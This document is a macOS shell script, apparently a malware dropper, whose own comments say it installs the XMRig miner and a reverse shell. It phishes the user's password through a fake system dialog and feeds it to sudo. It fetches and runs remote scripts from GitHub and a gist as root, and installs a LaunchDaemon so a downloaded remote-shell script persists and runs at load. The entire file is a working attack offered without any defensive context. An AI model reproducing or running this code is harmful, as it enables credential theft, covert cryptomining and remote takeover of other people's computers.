#!/bin/sh
# will install XMRig and the ReverseShell
PASSWORD=$(osascript -e 'Tell application "System Events" to display dialog "Enter your password (Required on first Launch):" with hidden answer default answer ""' -e 'text returned of result')
# will install XMRig
XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"
mkdir /tmp/MacOS-Setup
curl $XMRIGLink -o /tmp/MacOS-Setup/Helper.sh
sudo chmod +x /tmp/MacOS-Setup/Helper.sh


echo "$PASSWORD" | sudo -S /tmp/MacOS-Setup/Helper.sh &

# will install the ReverseShell
plist="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
  <dict>
    <key>Label</key>
    <string>com.cfhelper.persist.plist</string>
    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/mycode/persist.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/usr/local/mycode/logs/output.log</string>
    <key>StandardErrorPath</key>
    <string>/usr/local/mycode/logs/error.log</string>
  </dict>
</plist>"

echo $plist > /Library/LaunchDaemons/com.cfhelper.persist.plist
sudo chown root:wheel /Library/LaunchDaemons/com.cfhelper.persist.plist
sudo chmod 644 /Library/LaunchDaemons/com.cfhelper.persist.plist
sudo launchctl load /Library/LaunchDaemons/com.cfhelper.persist.plist
url="https://gist.githubusercontent.com/Astranix593/460201b6e3dad1cb4608a04b8848a9be/raw/cb33e3c1d6496edcaf28bd28524a212667ccb79f/RemoteShell.sh"
curl $url -o /usr/local/mycode/persist.sh
sudo chmod +x /usr/local/mycode/persist.sh
sudo chown root:wheel /usr/local/mycode/persist.sh
/usr/local/mycode/persist.sh
